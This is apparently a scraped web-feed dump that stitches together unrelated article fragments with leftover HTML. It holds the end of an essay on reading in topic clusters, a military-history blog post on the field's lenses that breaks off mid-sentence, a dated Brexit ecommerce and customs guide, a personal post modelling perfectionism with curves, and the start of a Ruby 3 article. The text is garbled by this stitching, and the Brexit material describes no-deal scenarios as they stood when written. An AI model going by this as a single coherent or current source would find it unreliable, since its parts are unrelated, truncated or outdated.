another book about ubiquitous technology, or another book about a one term president.</p><p>If you organize your reading this way, your bookshelf won't be arranged by genre like a typical bookstore. Rather than having sections for e.g. biographies, essays, novels, military history, all sorted by author, you will instead have sections for addressing different problems, likely sorted by clusters of books in order that you encountered them. The arrangement won't make sense to anyone except you. But you'll be able to find what you need instantaneously, and your capacity to examine the world from different perspectives will dramatically increase.</p><p>Waiting five, ten, fifteen years to build a mental lab may seem like an impossibly long time. But you don’t have to wait. It’s a pleasure to read about the Wright brothers, or proliferation of the telegraph, or early computer culture! And in a measly three months you’ll have acquired a fresh way of looking at the world. Already you will be a different person. Then you keep going, and keep looking for new instruments to double the utility of existing ones. And in one year? You will look back at today’s version of yourself and find it unrecognizable.</p><p><strong>TL;DR:</strong> Read ~40 pages/day, assume 30% failure rate. That's 10k pages and ~20 books annually. Pick a problem, and read clusters of five books to study that problem from a unique perspective. Visualize each cluster as an instrument to inspect the world. Collect instruments into a mental lab, with various stations for related instruments. You can upgrade the instruments one book at a time. Have your bookshelf reflect this mental image. Win the decade, not the day. Start now and never stop.</p></div></div>]]>

<p>This week, I want to talk about the discipline of military history: what it is, why it is important and how I see my own place within it.  This is going to be a bit of an unusual collections post as it is less about the past itself and more about how we study the past; it is also going to be a bit unusual in that it is mostly my own personal reflections, rather than a historical argument.</p>



<p>We do quite a lot of different kinds of history here on the blog.  There is a fair bit of<a href="https://acoup.blog/2019/09/07/new-acquisitions-class-status-and-the-early-church/"> social history,</a> some <a href="https://acoup.blog/2019/12/05/collections-a-trip-through-thucydides-fear-honor-and-interest/">intellectual </a><a href="https://acoup.blog/2019/12/12/collections-a-trip-through-cicero-natural-law/">history</a>, just a<a href="https://acoup.blog/2019/05/20/new-acquisitions-elective-monarchy-and-the-future-of-westeros/"> little bit of political history</a> and an absolute <a href="https://acoup.blog/tag/organic-economy/"><em>ton</em> of economic history</a>.  Obviously, I think all of those analytical lenses (and several I have not done, of course) are very important ways of understanding the past.  But a lot of what we discuss on the blog fits, narrowly or broadly, into the realm of <strong>military history</strong>.  And I want to talk about that.</p>



<p><strong>Now I should note that I do not consider myself purely a military historian</strong> – indeed, in my experience, few historians are ‘pure’ anything and if you narrow down their specialization enough, you simply end up with, “I am a historian of things which interest me” followed by a long list of what those are.  <strong>I see myself as both an economic and military historian (of the Mediterranean world, broadly construed)</strong> and my research tends to exist in the places where those two strands meet.  Sometimes that means processes that read as non-military (if it isn’t evident I have active research projects on farming and metal production, you haven’t been here long!) and sometimes those projects are more narrowly military.  <strong>I am a firm believer that a historian must be prepared to use whatever tools are going to provide the best answers to their research questions</strong>; for my own work, that has included (basic) statistical analysis, textual close reading, economic theory, archaeology (both traditional and experimental), social history, and even some chemistry and physics.  Whatever works!  But certainly, the methods of military history are one tool in my toolbox, even when I am looking to answer questions about non-military aspects of Mediterranean antiquity.</p>



<p><strong>It is no real secret that as a discipline, military history is sometimes held in low regard by other historians</strong>.  There are a number of reasons for this.  Often it has to do with outdated views on what military history <em>is</em> and what military historians <em>do</em>.  Frequently military history, because it has a large enthusiast and amateur audience, is regarded as an amateur field (something which is not helped by publishers who push quite out reams of quite frankly substandard works of this sort) lacking in sophistication, which is not accurate, but often believed.  And perhaps most often, in my experience, <strong>these opinions serve as cover for a deeper conviction that studying militaries and warfare is icky and only done by people who <em>like</em> war</strong> (when I was a student, this opinion when it was expressed by a certain generation of scholars, now mostly retired, came with a <em>very</em> predictable dose of Vietnam-era anti-military sentiment).  Often it seems the study of military history is neglected by other historians precisely because they find the subject matter uncomfortable.</p>



<p>So I want to talk about three major things here: what military history actually is and how it is done these days, why we should study military history and finally what my experience of being a military historian (both as a scholar and a teacher) has been, particularly given that I am a life-long civilian.  </p>

<h2>What is Military History?</h2>



<p>The popular conception of military history – indeed, the conception sometimes shared even by other historians – is that it is fundamentally a field about charting the course of armies, describing ‘great battles’ and praising the ‘strategic genius’ of this or that ‘great general.’  One of the more obvious examples of this assumption – and the contempt it brings – comes out of the popular CrashCourse youtube series.  When asked by their audience to cover military history related to their coverage of <em>the American Civil War</em>, the response was <a href="https://youtu.be/25HHVDOaGeE">this video listing battles </a>and reflecting on the pointless of the exercise, as if a list of battles was all that military history was (the same series would later say that military historians <a href="https://youtu.be/rlx6ur_D51s?t=323">don’t talk about about food</a>, a truly baffling statement given the important of logistics studies to the field; certainly in my own subfield, military historians tend to talk about food more than any other kind of historian except for dedicated food historians).</p>



<p>The term for works of history in this narrow mold – all battles, campaigns and generals – is <strong>“drums and trumpets” history, a term generally used derisively</strong>.  The study of battles and campaigns emerged initially as a form of training for literate aristocrats preparing to be officers and generals; it is little surprise that they focused on aristocratic leadership as the primary cause for success or failure.  Consequently, the old ‘drums and trumpets’ histories also had a tendency to<a href="https://acoup.blog/2020/04/16/collections-a-trip-through-bertran-de-born-martial-values-in-the-12th-century-occitan-nobility/"> glory in war </a>and to glorify commanders for their ‘genius’ although this was by no means universal and works of history on conflict as far back as Thucydides and Herodotus (which is to say, as far back as there have been any) have reflected on the destructiveness and tragedy of war.  But military history, like any field, matured over time; I should note that it is <a href="https://acoup.blog/2020/02/07/collections-the-fremen-mirage-part-iiia-by-the-princess-irulan/">hardly the only field of history to have less respectable roots</a> in <a href="https://acoup.blog/2020/02/14/collections-the-fremen-mirage-part-iiib-myths-of-the-atreides/">its quite recent past</a>.  Nevertheless, as the field matured and moved beyond military aristocrats working to emulate older, more successful military aristocrats into a field of scholarly inquiry (still often motivated by the very real concern that officers and political leaders be prepared to lead in the event of conflict) the field has become far more sophisticated and its gaze has broadened to include not merely non-aristocratic soldiers, but non-soldiers more generally.</p>



<p>Instead of the ‘great generals’ orientation of ‘drums and trumpets,’ the field has moved in the direction of three major analytical lenses, laid out quite ably by Jeremy Black in “Military Organisations and Military Charge in Historical Perspective” (<em>JMH</em>, 1998). <strong> He sets out the three basic lenses as technological, social and organizational, which speak to both the questions being asked of the historical evidence but also the answers that are likely to be provided</strong>.  I should note that these lenses are mostly (though not entirely) about <em>academic</em> military history; much of the amateur work that is done is still very much ‘drums and trumpets’ (as is the occasional <em>deeply frustrating</em> books from some older historians we need not discuss here), although that is of course not to say that there isn’t good military history being written by amateurs or that all good military history narrowly follows these schools.  <strong>This is a classification system, not a straight-jacket and I am giving it here because it is a useful way to present the complexity and sophistication of the field as it is, rather than how it is imagined by those who do not engage with it.</strong></p>



<p>(I should note that <em>campaign studies</em> have not been entirely abandoned either.  What distinguishes the modern campaign or battle study from the old ‘drums and trumpets’ style is a broader use of historical causality that reaches beyond just upper-level command decisions. <a href="https://acoup.blog/2020/10/30/fireside-friday-october-30-2020/"> Our recent recommendation, <em>Shattered Sword</em></a> is a good example of how what might have been a ‘drums and trumpets’ narrative of admirals and captains can instead be developed, using more sophisticated historical methods, into a much more complete and compelling historical argument about organizations, doctrines, technologies and so on.  And of course campaign histories will never go out of style – they are the essential foundation on which all other kinds of analysis must be laid)</p>



<p><strong>The technological approach is perhaps the least in fashion these days</strong>, but Geoffery Parker’s <em>The Military Revolution</em> (2nd ed. 1996) provides an almost pure example of the lens.  This approach tends to see changing technology – not merely military technologies, but often also civilian technologies – as the main motivator of military change (and also success or failure for states caught in conflict against a technological gradient).  <strong>Consequently, historians with this focus are often asking questions about how technologies developed, why the developed in certain places, and what their impacts were</strong>.  Another good example of the field, for instance, is the debate about the impact of <a href="https://www.amazon.com/gp/product/0700623833/ref=ppx_yo_dt_b_search_asin_title?ie=UTF8&amp;psc=1">rifled muskets</a> in the <a href="https://www.amazon.com/gp/product/171985727X/ref=ppx_yo_dt_b_asin_title_o07_s00?ie=UTF8&amp;psc=1">American Civil War</a>.  While there has been a real drift away from seeing technologies themselves as decisive on their own (and thus a drift away from mostly ‘pure’ technological military history) in recent decades, this sort of history is very often paired with the others, looking at the ways that social structures, organizational structures and technologies interact.</p>



<p><strong>Perhaps the <em>most</em> popular lens for military historians these days is the social one</strong>, which used to go by the “new military history” (<em>decades </em>ago – it was the standard form even back in the 1990s) but <strong>by this point comprises probably the bulk of academic work on military history</strong>.  In its narrow sense, the social perspective of military history seeks to understand the army (or navy or other service branch) as an extension of the society that created it.  We have, you may note,<a href="https://acoup.blog/2020/05/22/collections-the-battle-of-helms-deep-part-iv-men-of-rohan/"> done a bit of that here</a>.  Rather than understanding the army as a pure instrument of a general’s ‘genius’ it imagines it as a <em><strong>socially embedded</strong></em> institution – which is …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Brexit and the implications for ecommerce. Brexit is on agendas across the country and the main cause for concern is the ongoing uncertainty surrounding it, for whilst uncertainty remains, it’s hard to plan ahead. Still, everyone wants to know: how will Brexit impact UK trade?</p><p>For the UK ecommerce and logistics market, the focus is on the movement of goods to EU countries. Here we collate some of the potential implications of different Brexit scenarios including information on importing, exporting, VAT, customs and duties, and how processes may change when we leave the EU.</p><p>Although no one can currently be sure what kind of Brexit the UK will get, it is worth keeping these variables and implications in mind. None of this should be taken as legal advice but, as Brexit talks progress, it may be wise to start assessing how they may impact your business and if your partners and suppliers have started thinking about them too.</p><h2>Implications of Brexit in a no-deal scenario</h2><h3>High-level implications for the UK in a no-deal scenario:</h3><p>The UK becomes a third country whose relations with the EU would be governed by general international public law, including rules of the World Trade Organisation (WTO). The WTO deals with the global rules of trade between nations. Its main function is to ensure that trade flows as smoothly, predictably and freely as possible.</p><p>The European Union must apply its regulation and tariffs at borders with the UK as a third country, including checks and controls for customs, sanitary and phytosanitary standards (to protect humans, animals, and plants from diseases, pests, or contaminants that may enter an EU state), and verification of compliance with EU norms.</p><p>Transport between the UK and the EU would be impacted and sanitary and phytosanitary controls at borders could cause significant customs delays through difficulties at ports and longer road transport times.</p><p>Depending on the circumstances leading to withdrawal without an agreement, the EU may wish to enter into negotiations with the UK as a third country.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122,h_740/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122,h_740/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg" alt="Brexit Implications for ecommerce" width="1122" height="740" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg 1122w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-980x646.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-480x317.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1122px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1122/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f.jpeg 1122w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-980x646.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/9e56238cd27d85d04273476e317ea8e39d81e48f-480x317.jpeg 480w"></p><h3>Implications for UK businesses:</h3><p>If the UK leaves the EU without a deal we will become a third country, with no preferential deal for customs purposes or for VAT. Duties and taxes will be payable on all goods and shipping times may vary depending on customs clearance.</p><p>Licenses and approvals issued by the UK will no longer be recognised by the EU.</p><p>Companies based in the UK&nbsp;can no longer operate in the EU as a member state and need to establish a representative in an EU country.</p><p>The UK stops being part of EU systems. Access to these systems would need to be renegotiated as a third country.</p><p>Printed matter including catalogues and direct mail may be impacted. If airports and ports are open there should be no change to how this mail is distributed, via post, to the EU. However, if goods traffic is held at ports, tunnels and airports, then mail could also be held up with it.</p><p>UK companies will have to change the way they manage data transfers, such as consumer data for shipping-labels if the data originates from businesses within the EU. Further information can be found on the <a href="https://ico.org.uk/for-organisations/data-protection-and-brexit/" target="_blank" rel="noopener noreferrer">ICO website</a>.</p><h2>What customs arrangements do we currently get as part of the EU?</h2><p>The current customs arrangements allow businesses to move goods freely between EU member states. For customs, this means that businesses trading with the rest of the EU do not have to make any customs import or export declarations. Trade with the EU is not subject to import duty.</p><p>Certain goods are subject to excise duty. These goods are currently free to move between the UK and the rest of the EU with excise duty suspended. The three categories of excise goods that can be held in an excise warehouse in duty-suspension are:</p><ol><li>Alcohol products&nbsp;including&nbsp;beers,&nbsp;wines&nbsp;and spirits.</li><li>Tobacco products&nbsp;including&nbsp;cigarettes, cigars and loose&nbsp;tobacco.</li><li>Energy products&nbsp;including&nbsp;hydrocarbon oils&nbsp;and biofuels for use as&nbsp;motor or&nbsp;heating fuel.</li></ol><p>The government has negotiated to remain in the Common Transit Convention after Brexit to facilitate cross-border movements of goods between contracting parties to the Convention. This will reduce admin activity required by traders. For example, any payment charges due on goods will only be required in their destination country. This should partially mitigate some consequences for the travel of non-EU goods within the EU in the event of a no-deal Brexit.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121,h_738/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121,h_738/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg" alt="Brexit Implications for ecommerce" width="1121" height="738" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg 1121w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-480x316.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1121px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1121/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1.jpeg 1121w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/6e2491da23c3019a2269456a4fea40f1182c11a1-480x316.jpeg 480w"></p><h2>What are the current VAT and duties arrangements for goods travelling to the EU?</h2><p>VAT is payable by businesses when they bring goods into the UK. There are different rules depending on whether the goods come from an EU or non-EU country.</p><p>Goods that are exported by UK businesses to non-EU countries and EU businesses are zero-rated, meaning that UK VAT is not charged at the point of sale.</p><p>Goods that are exported by UK businesses to EU consumers have either the UK or EU VAT charged, subject to distance selling thresholds.</p><p>For services, the ‘place of supply’ rules determines the country in which you need to charge and account for VAT.</p><h2>What will a no-deal scenario mean for customs arrangements of goods?</h2><h3>Trade with friction</h3><p>The same customs and excise rules for goods moving between the UK and the non-EU countries will apply to goods moving between the UK and EU. Import and export declarations will also be required.</p><h3>Carrier declarations</h3><p>Carrier declarations will be required for the safety and security of goods.</p><h3>Excise goods</h3><p>The Excise Movement Control System (EMCS) would no longer be used to control suspended movements between the EU and the UK, so the aforementioned excise goods would no longer enjoy duty-suspended movement.</p><h3>Importation for EU</h3><p>Goods entering the UK from the EU will require import declarations. Customs checks may be carried out and any customs duties must be paid.</p><p>Companies must register for a UK Economic Operator Registration and Identification (EORI) number to be used on customs declarations by freight forwarders and couriers and accurate classification on imported material will be needed.</p><p>Arrangements will need to be made with Brokerage and Freight Forwarding companies to get goods to the point of final distribution.</p><h3>Exporting from the UK</h3><p>Businesses must register for a UK EORI number to export, and contracts and International Terms and Conditions of Service (<a href="https://www.gov.uk/guidance/international-trade-paperwork-the-basics" target="_blank" rel="noopener noreferrer">INCOTERMS</a>) must be amended to reflect that your business is now an exporter.</p><p>Export declarations and safety and security declarations will be required.</p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119,h_736/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119,h_736/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg" alt="Brexit Implications for ecommerce" width="1119" height="736" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg 1119w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-480x316.jpeg 480w" data-sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1119px, 100vw" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_1119/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da.jpeg 1119w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_980/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-980x645.jpeg 980w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_480/https://www.swifterm.com/wp-content/uploads/2020/11/bfd11cdbac63299cab2e2ae6c99a93d047d658da-480x316.jpeg 480w"></p><h2>What will a no-deal scenario mean for VAT and duties arrangements for goods?</h2><h3>VAT imports</h3><p>Postponed accounting will need to be introduced for import VAT on goods brought into the UK.

This aligns the UK with the global direction of travel on&nbsp;LVCR. This means that all goods entering the UK, as parcels sent by overseas businesses, will be liable for VAT.</p><p>Overseas businesses will charge VAT at the point of purchase and will be expected to register with an HM Revenue &amp; Customs (HMRC) digital service and account for the VAT due.</p><h3>VAT on exported goods</h3><p>If the UK leaves the EU without an agreement, VAT registered UK businesses will continue to be able to zero-rate sales of goods to EU businesses but will not be required to complete EU sales lists.</p><p>Current EU rules would mean that EU member states will treat goods entering the EU from the UK in the same way as goods entering from other non-EU countries. Associated import VAT and customs duties would be due when the goods arrive in the EU.</p><h2>What are the implications of the EU accepting a government deal?</h2><p>If a deal, similar to that already constructed by the UK Government, were to be accepted by both Parliament and the EU, there would be a few different implications to consider.</p><p>As of the 30th March 2019, the UK no longer participates in EU decision-making, EU institutions, and governance of EU bodies and agencies.</p><p>The role of EU institutions in the supervision and enforcement of EU law in the UK would continue throughout the transition period.</p><p>The EU would need to negotiate with the UK an agreement on their future relationship, which should ideally be in place (agreed, signed and ratified) at the end of the transition period and apply as from 1st January 2021.</p><p>UK businesses would have some planning time as there would be no immediate impact on customs procedures and the ability to import and export within the EU. There would also be no changes to customs declarations.</p><p>Alternate recommended articles:</p><p>:<a href="https://www.swifterm.com/the-2nd-tier-of-email-marketing/"><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_298,h_198/https://www.swifterm.com/wp-content/uploads/2020/09/2nd-tier-email-solution-1.jpeg" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_298,h_198/https://www.swifterm.com/wp-content/uploads/2020/09/2nd-tier-email-solution-1.jpeg" alt="2nd-tier-email-solution" width="298" height="198"></a></p></div></div>]]>

					<p>I struggle with perfectionism. Well, not so much “struggle with” — I’m f*cking great at it. It comes naturally.</p>
<p>There are some upsides, but perfectionism is also associated with anxiety, depression, procrastination, and damaged relationships. Perhaps you, like I, have spent far too much time and emotional energy making sure that an email had the right word choice, had no typos, didn’t reuse a phrase in successive sentences/paragraphs, and closed with the ‘correct’ sign-off. (‘Best,’ is almost always optimal, by the way).</p>
<blockquote><p>“If I couldn’t do something that rated 10 out of 10 — or at least close to that — I didn’t want to do it at all. Being a perfectionist was an ongoing source of suffering and unhappiness for me … Unfortunately, many of us have been conditioned to hold ourselves to impossible standards. This is a stressful mind state to live in, that’s for sure.” ~ <a href="https://www.psychologytoday.com/us/blog/turning-straw-gold/201806/how-overcome-your-perfectionist-tendencies" target="_blank" rel="noopener">Tony Bernard J.D.</a></p></blockquote>
<p>The topic of perfectionism confused me for years. Of course you want things to be perfect; why would you ever actively want something to be worse? However, there’s way more to it than that: It’s a complex interplay between effort, time, motivation, and expectations.</p>
<p>Far too many self-help recommendations essentially said “Be ok with mediocrity!” which… did not speak to me, to say the least.</p>
<p>To better understand the concept, I went through a number of books and papers before building a quasi-mathematical model. You know, like ya’do.</p>
<p>I’ve come to see perfectionism as a mindset with a particular calibration between the quality of your work and your emotional reaction — with decreased sensitivity to marginal differences in lower-quality work and increasing sensitivity as the quality goes up.</p>

<ul>
<li><span><strong>In a “Balanced” mindset,</strong> </span>you become happier in linear proportion to how much better your work is going. (y = x)</li>
<li><span><strong>In a “Satisficing” mindset</strong></span> — taking a pass/fail test, for example — you care about whether something is “good enough”. Most of your emotional variance comes as you approach and meet that threshold.&nbsp; ( e^x / (1+e^x) )</li>
<li><span><strong>In a Perfectionist mindset,</strong></span> the relationship between quality and emotion is polynomial. You feel almost equally bad about scoring a 40% on a test vs. a 65%, but the difference between a 90% and 93% looms large. (y = x^7)</li>
</ul>
<p>Looking at the model, I realized it could explain a number of experiences I’d had.</p>
<hr>
<h3>Why even small tasks seem daunting to a perfectionist</h3>
<p>A common experience with a perfectionist mindset is having trouble ‘letting go’ of a project — we want to keep tinkering with it, improving it, and never feel quite comfortable moving on. &nbsp;(I don’t want to say how long this draft sat around.)</p>
<p>This make sense given the model:</p>
<p><img data-attachment-id="2369" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/happyenough/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=1200%2C702&amp;ssl=1" data-orig-size="1200,702" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="HappyEnough" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?fit=630%2C369&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;ssl=1" alt="HappyEnough" width="630" height="369" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/happyenough.png?resize=630%2C369&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>When I think about clicking ‘send’ or ‘post’ before I’ve checked for typos, before I’ve reread everything, before considering where it might be wrong or unclear… it just feels, well, WRONG. I’m not yet happy with it and have trouble declaring it done.</p>
<p>Apart from requiring more time and effort, this can make even seemingly trivial tasks feel daunting. Internally, if you know that a short email will take an hour and a half it’s going to loom large even if you have trouble explaining quite why such a small thing is making you feel overwhelmed.</p>
<hr>
<p><strong>What’s helped me:</strong> A likely culprit is overestimating the consequences of mistakes. One solution is to be concrete and write down what you expect to happen if it turns out you have a typo, miss a shot, or bomb a test. Sometimes all it takes to readjust is examining those expectations consciously. Other times you’ll need to experience the ‘failure’, at which point you can compare it to your stated expectations.</p>
<hr>
<h3>Why perfectionists give up on hobbies and tasks easily</h3>
<p>Another way to look at this is: if you don’t expect to reach high standards, a project just doesn’t seem worth doing.</p>
<p><img data-attachment-id="2368" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/adequateresults/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=1266%2C744&amp;ssl=1" data-orig-size="1266,744" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="AdequateResults" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=630%2C370&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;ssl=1" alt="AdequateResults" width="630" height="370" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>The result is a kind of min-max of approach to life: If you can’t excel, don’t bother spending time on it.</p>
<p>That’s not necessarily a bad thing!</p>
<p>However, we don’t always have control. In my nonprofit communications career, I sometimes got assigned to write press releases on topics that *might* get attention, but which seemed not newsworthy to me. It may have still been worth the few hours of my time in case it grabbed a reporter’s eye. It was important to keep my job. But I had so. much. trouble. getting myself to do the work.</p>
<p>Even in the personal realm, picking up a new hobby is made difficult. If it doesn’t seem like you’re going to be amazing at it, the hobby as a whole loses its luster.</p>
<hr>
<p><strong>What’s helped me: </strong>A big problem for me has been overlooking the benefits gained from so-called “failure”. Once I start to factor in e.g. how much I expect to learn (so that I can do better in the future) I end up feeling much better about giving things a shot.</p>
<hr>
<h3>Why procrastination (and anxiety) are common</h3>
<p>At a granular scale, the problem becomes worse. Rather than “How good do I expect to feel at the end of this?” our emotional reaction is probably trained by the in-the-moment “How much happier do I expect to feel as a result of one more bit of work?”</p>
<p>In other words, we can view the derivative/slope of these graphs as motivation:</p>

<p>With a perfectionist mindset, the bigger and further away a goal is, the more difficult it will be to feel motivated in the moment.&nbsp; For much of the time, we’re trying to push ourselves to work without getting any internal positive reinforcement.</p>
<p>This is a particular issue in the Effective Altruism movement where the goal is to *checks notes* Save the World. Also, to (“Figure out how to do the most good, and then do it.”)</p>
<p>It’s true that as a perfectionist nears their goal, they’re extremely motivated! But that also means that the stakes are very high for every decision and every action.&nbsp; …Which is a recipe for anxiety. Terrific.</p>
<hr>
<p><strong>What’s helped me: </strong>To the extent that I can, I find that breaking tasks into pieces helps. If I think of my goal as “Save the World”, another day of work won’t feel very important. But a goal of “Finish reading another research paper” is something I can make real progress on in a day!</p>
<hr>
<h2>All models are wrong, but some are useful</h2>
<p>This framework isn’t perfect. Neither is this writeup. (I’m hyper-aware.) But this idea has been in my head, in my drafts folder, and unfinished for months. Rather than give in to the sense that I “should” keep working on it, I’m going to try following my own advice. I’m remembering that:</p>
<ul>
<li>I’ve clarified my thinking a ton by writing everything down.</li>
<li>The consequences of a sloppy post in are minimal in the big scheme of things.</li>
<li>This isn’t supposed to be my final conclusion – it’s one step on the path</li>
</ul>
<p>Even if it’s not perfect, perhaps the current iteration of this framework can help you understand me, yourself, or perfectionists in your life.</p>
<p>I used to have this “DONE IS BETTER THAN PERFECT” poster draped over a chair in my office. I never got around to hanging it up, but honestly? It seems better that way.</p>

November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

